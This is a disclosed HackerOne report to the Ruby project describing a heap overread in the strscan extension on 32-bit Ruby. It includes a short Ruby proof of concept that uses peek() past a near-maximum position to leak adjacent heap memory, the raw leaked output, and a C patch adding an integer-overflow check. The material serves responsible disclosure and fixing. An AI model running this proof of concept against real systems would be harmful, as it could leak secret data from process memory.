# Arbitrary heap overread in strscan on 32 bit Ruby, patch included

## Report Details
- **Report ID**: 166661
- **URL**: https://hackerone.com/reports/166661
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-09-07T20:12:07.163Z
- **Disclosed**: 2016-11-17T00:30:21.494Z

## Reporter
- **Username**: guido
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
```ruby
require 'strscan'
x = 'x' * 0x7FFFFFFE
s = StringScanner.new(x)
s.pos = 0x7FFFFFFD
t = s.peek(40000)
t.each_byte do |i|
	if i != 0
		print i.chr
	end
end
```

Run:

```sh
./ruby r.rb | strings
```

My output:

```
@	;>@V`TdBE
__gmon_start___fini_ITM_deregisterTMCloneTable_ITM_registerTMCloneTable__cxa_finalize_Jv_RegisterClassesonig_region_memsizeonig_region_freeruby_xfreerb_gc_markrb_check_typeddatarb_num2longrb_eRangeErrorrb_raiserb_int2bigrb_eArgErrorrb_string_valuerb_reg_region_copyrb_memerrorrb_scan_argsrb_data_typed_object_zalloconig_region_initrb_str_newrb_str_dumprb_str_new_staticrb_str_catrb_funcallrb_str_lengthrb_str_appendrb_warningrb_enc_copyrb_sym2strrb_enc_getonig_name_to_backref_numberrb_eIndexErrorrb_enc_raiseonig_region_clearonig_region_setrb_enc_mbclenrb_check_typerb_reg_prepare_reonig_matchonig_freeonig_searchrb_obj_classrb_sprintfInit_strscanrb_cObjectrb_define_classrb_eStandardErrorrb_define_class_underrb_const_definedrb_obj_freezerb_const_setrb_define_alloc_funcrb_define_private_methodrb_define_singleton_methodrb_define_methodrb_intern2rb_aliaslibpthread.so.0libdl.so.2libcrypt.so.1libm.so.6libc.so.6_edata__bss_start_endGLIBC_2.1.3
@xh[
D$ P
UWVS
[^_]
&UWVS
[^_]
t&WVS
t&VS
'WVS
D$ P
t&UWVS
[^_]
;|$0|
L$0)
;|$0|
L$0)
'UWVS
l$<P
[^_]
~`9G
[^_]
PjjW
vWVS
PjjW
t&WVS
PjjW
vUWVS
[^_]
vUWVS
|$@P
[^_]
'UWVS
|$<j
[^_]
~$RW
QRQU
&UWVS
|$<j
[^_]
~$RW
RPRPU
UWVS
|$<j
[^_]
~$RW
QRQU
[^_]
UWVS
|$<j
[^_]
~$RW
RPRPU
&UWVS
|$<j
[^_]
~$RW
RPRPU
[^_]
&UWVS
|$<j
[^_]
~$RW
QRQU
'UWVS
|$<j
[^_]
~$RW
QRQU
UWVS
|$<j
[^_]
~$RW
RPRPU
UWVS
|$<j
[^_]
~$RW
RPRPU
UWVS
|$<j
[^_]
~$RW
QRQU
t&UWVS
|$<P
[^_]
'UWVS
[^_]
&UWVS
[^_]
vWVS
^j/P
 jPW
 [^_
uninitialized StringScanner objectunscan failed: previous match record not existStringScanner#clear is obsolete; use #terminate insteadStringScanner#restsize is obsolete; use #rest_size insteadundefined group name reference: %.*sStringScanner#getbyte is obsolete; use #get_byte insteadStringScanner#peep is obsolete; use #peek insteadStringScanner#empty? is obsolete; use #eos? instead$Id: strscan.c 52988 2015-12-09 01:01:17Z ko1 $index out of range11...regexp buffer overflow#<%li
 (uninitialized)>#<%li
 fin>#<%li
 %ld/%ld @ %li
>#<%li
 %ld/%ld %li
 @ %li
>ScanErrorbytesliceStringScanner0.7.0VersionIdinitializeinitialize_copymust_C_versionresetterminateclearstringstring=concat<<pos=charpospointerpointer=skipmatch?checkscan_fullscan_untilskip_untilexist?check_untilsearch_fullgetchget_bytegetbytepeekpeepunscanbeginning_of_line?bol?eos?empty?rest?matched?matchedmatched_size[]pre_matchpost_matchrestrest_sizerestsizeinspect
;*2$"
 pH	p
vGCC: (Debian 4.9.2-10) 4.9.2
^<	 M
PF	Y
H	$M
)d	nW
4,	'b
@	;y
^P	(
^T	`
^X	]
\	g2
		6%
^<	 M
PF	Y
H	$M
)d	nW
4,	'b
@	;y
^P	(
^T	`
^X	]
\	g2
		6%
```

Proposed patch is as follows. Note that I avoid the easy way of checking for overflow ie.
```c
beg_i + len < beg_i
```

since that implies a signed integer overflow which is officially undefined behavior in C and reportedly may lead to unexpected results on some architectures. But feel free to implement a patch however you want.

```diff
diff --git a/ext/strscan/strscan.c b/ext/strscan/strscan.c
index 9b52fea..7dfe17a 100644
--- a/ext/strscan/strscan.c
+++ b/ext/strscan/strscan.c
@@ -153,7 +153,7 @@ static VALUE
 extract_beg_len(struct strscanner *p, long beg_i, long len)
 {
     if (beg_i > S_LEN(p)) return Qnil;
-    if (beg_i + len > S_LEN(p))
+    if (len < 0 || beg_i > (LONG_MAX - len) || beg_i + len > S_LEN(p))
         len = S_LEN(p) - beg_i;
     return infect(str_new(p, S_PBEG(p) + beg_i, len), p);
 }
```

Note that malice isn't necessarily required to trigger this vulnerability; any Ruby program that uses strscan to simply operate on large buffers may unknowingly exfiltrate secret data (if the peek()'d data ever leaves the system).

The vulnerability is not expected to work on 64 bit systems because of the much larger limits of the ```long``` type, and the requirement that the sizes of the buffers and available heap memory are accordingly large.

Tested on ruby-2.3.1 

## Attachments
No attachments
